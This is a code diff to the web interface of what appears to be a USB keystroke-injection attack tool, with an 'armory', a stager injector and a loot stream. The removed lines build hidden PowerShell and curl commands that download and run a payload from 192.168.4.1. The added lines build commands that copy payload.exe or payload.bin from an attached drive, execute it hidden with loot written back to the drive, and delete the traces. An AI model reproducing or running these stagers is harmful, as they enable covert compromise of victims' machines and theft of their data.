@@ -5,7 +5,6 @@ const runButton = document.getElementById('run');
 const refreshButton = document.getElementById('refresh');
 const keyboardOsSelect = document.getElementById('keyboard-os');
 const keyboardLayoutSelect = document.getElementById('keyboard-layout');
-const deliveryModeSelect = document.getElementById('delivery-mode');
 const usbAgentState = document.getElementById('usb-agent-state');
 const usbAgentToggle = document.getElementById('usb-agent-toggle');
 const runHistory = document.getElementById('run-history');
@@ -254,12 +253,8 @@ function updateControls() {
   }
   const injectBtn = document.getElementById('inject-binary-btn');
   if (injectBtn) {
-    const delivery = deliveryModeSelect?.value || 'network';
     const mounted = (uiState.usbAgent || {}).mounted;
-    injectBtn.disabled =
-      uiState.running ||
-      !uiState.hasBinary ||
-      (delivery === 'usb_drive' && !mounted);
+    injectBtn.disabled = uiState.running || !uiState.hasBinary || !mounted;
   }
 }
 
@@ -390,17 +385,9 @@ function renderUsbAgent(state) {
     usbAgentState.textContent = label;
   }
   if (usbAgentToggle) {
-    usbAgentToggle.textContent = agent.mounted ? 'Unmount' : 'Mount';
+    usbAgentToggle.textContent = agent.mounted ? 'Deactivate' : 'Activate';
   }
   updateControls();
-}
-
-function preferAvailableDelivery() {
-  if (!deliveryModeSelect) {
-    return;
-  }
-  const agent = uiState.usbAgent || {};
-  deliveryModeSelect.value = agent.available ? 'usb_drive' : 'network';
 }
 
 function measureEditor() {
@@ -675,7 +662,6 @@ async function loadBootstrap() {
   setBoundText('ap_password', state.ap_password || 'Open network');
   renderKeyboardLayouts(state);
   renderUsbAgent(state);
-  preferAvailableDelivery();
   uiState.hasBinary = Boolean(state.has_binary);
   renderRunHistory(state.run_history || []);
   setBoundText('seeded', state.seeded ? 'Yes' : 'No');
@@ -693,7 +679,9 @@ async function loadBootstrap() {
     queueValidation();
   }
   setNotice(state.message || '', state.notice || 'quiet');
-  if (state.has_binary) setArmoryBinaryReady(_TMP_BINARY_NAME);
+  if (state.has_binary) {
+    setArmoryBinaryReady(state?.usb_agent?.filename || 'Staged');
+  }
   else updateControls();
   startLootStream();
 }
@@ -1102,10 +1090,8 @@ function startLootStream() {
 
 // ─── Accordion ────────────────────────────────────────────────────────────
 
-const _TMP_BINARY_NAME = 'payload.bin';
-const _USB_VOLUME_LABEL = 'PICOBIT';
-const _USB_WINDOWS_AGENT = 'pico-agent';
-const _USB_UNIX_AGENT = 'pico-agent';
+const _USB_WINDOWS_AGENT = 'payload.exe';
+const _USB_UNIX_AGENT = 'payload.bin';
 const _ALLOWED_BINARY_EXTENSIONS = new Set(['appimage', 'bin', 'elf', 'exe']);
 const _BLOCKED_FILE_TYPES = new Set([
   'application/gzip',
@@ -1296,18 +1282,18 @@ document
   .getElementById('inject-os')
   ?.addEventListener('change', _updateArmorySnippet);
 
-deliveryModeSelect?.addEventListener('change', _updateArmorySnippet);
-deliveryModeSelect?.addEventListener('change', updateControls);
-
 usbAgentToggle?.addEventListener('click', async () => {
   const mounted = !(uiState.usbAgent || {}).mounted;
   uiState.changingUsbAgent = true;
   updateControls();
-  _setArmoryNotice(mounted ? 'Mounting USB agent drive…' : 'Unmounting USB agent drive…', 'quiet');
+  _setArmoryNotice(
+    mounted ? 'Activating USB injector…' : 'Deactivating USB injector…',
+    'quiet',
+  );
   try {
     const result = await requestJson('/api/usb-agent', {
       method: 'POST',
-      body: JSON.stringify({ mounted }),
+      body: JSON.stringify({ active: mounted }),
     });
     renderUsbAgent(result);
     _setArmoryNotice(result.message || 'USB agent drive updated.', result.notice || 'success');
@@ -1322,21 +1308,13 @@ usbAgentToggle?.addEventListener('click', async () => {
 
 function _updateArmorySnippet() {
   const os = document.getElementById('inject-os')?.value || 'windows';
-  const delivery = deliveryModeSelect?.value || 'network';
-  const url = 'http://192.168.4.1/static/payload.bin';
   let cmd = '';
-  if (delivery === 'usb_drive' && os === 'windows') {
-    cmd = `powershell -w hidden -c "$v=Get-Volume -FileSystemLabel ${_USB_VOLUME_LABEL} -ErrorAction SilentlyContinue; if($v){$s=$v.DriveLetter + ':/${_USB_WINDOWS_AGENT}'; $d=Join-Path $env:TEMP 'pico_agent.exe'; Copy-Item $s $d -Force; & $d}"`;
-  } else if (delivery === 'usb_drive' && os === 'macos') {
-    cmd = `cp /Volumes/${_USB_VOLUME_LABEL}/${_USB_UNIX_AGENT} /tmp/pico_agent && chmod +x /tmp/pico_agent && /tmp/pico_agent &`;
-  } else if (delivery === 'usb_drive') {
-    cmd = `for d in /media/$USER/${_USB_VOLUME_LABEL} /run/media/$USER/${_USB_VOLUME_LABEL}; do [ -f "$d/${_USB_UNIX_AGENT}" ] && cp "$d/${_USB_UNIX_AGENT}" /tmp/pico_agent && chmod +x /tmp/pico_agent && /tmp/pico_agent & break; done`;
-  } else if (os === 'windows') {
-    cmd = `powershell -w hidden -c "iwr ${url} -OutFile $env:TEMP\\pico_agent.exe; & $env:TEMP\\pico_agent.exe"`;
+  if (os === 'windows') {
+    cmd = `powershell -w hidden -c "$r=(Get-PSDrive -PSProvider FileSystem | % Root | ?{Test-Path ($_ + '${_USB_WINDOWS_AGENT}')} | select -First 1); if($r){$s=$r + '${_USB_WINDOWS_AGENT}'; $loot=$r + 'loot-usb.json'; $d=Join-Path $env:TEMP 'pico_agent.exe'; Copy-Item $s $d -Force; & $d --loot-out $loot; Remove-Item $d -Force -ErrorAction SilentlyContinue}"`;
   } else if (os === 'macos') {
-    cmd = `curl -s ${url} -o /tmp/pico_agent && chmod +x /tmp/pico_agent && /tmp/pico_agent &`;
+    cmd = `for d in /Volumes/*; do [ -f "$d/${_USB_UNIX_AGENT}" ] && cp "$d/${_USB_UNIX_AGENT}" /tmp/pico_agent && chmod +x /tmp/pico_agent && /tmp/pico_agent --loot-out "$d/loot-usb.json" ; rm -f /tmp/pico_agent; break; done`;
   } else {
-    cmd = `curl -s ${url} -o /tmp/pico_agent && chmod +x /tmp/pico_agent && /tmp/pico_agent &`;
+    cmd = `for d in /media/$USER/* /run/media/$USER/* /mnt/*; do [ -f "$d/${_USB_UNIX_AGENT}" ] && cp "$d/${_USB_UNIX_AGENT}" /tmp/pico_agent && chmod +x /tmp/pico_agent && /tmp/pico_agent --loot-out "$d/loot-usb.json" ; rm -f /tmp/pico_agent; break; done`;
   }
   const snippetEl = document.getElementById('armory-snippet');
   const codeEl = document.getElementById('armory-snippet-code');
@@ -1422,14 +1400,13 @@ document
   .getElementById('inject-binary-btn')
   ?.addEventListener('click', async () => {
     const os = document.getElementById('inject-os')?.value || 'windows';
-    const delivery = deliveryModeSelect?.value || 'network';
     const btn = document.getElementById('inject-binary-btn');
     if (btn) btn.disabled = true;
     _setArmoryNotice('Injecting stager…', 'quiet');
     try {
       const result = await requestJson('/api/inject_binary', {
         method: 'POST',
-        body: JSON.stringify({ os, delivery }),
+        body: JSON.stringify({ os }),
       });
       _setArmoryNotice(
         result.message || 'Injected.',
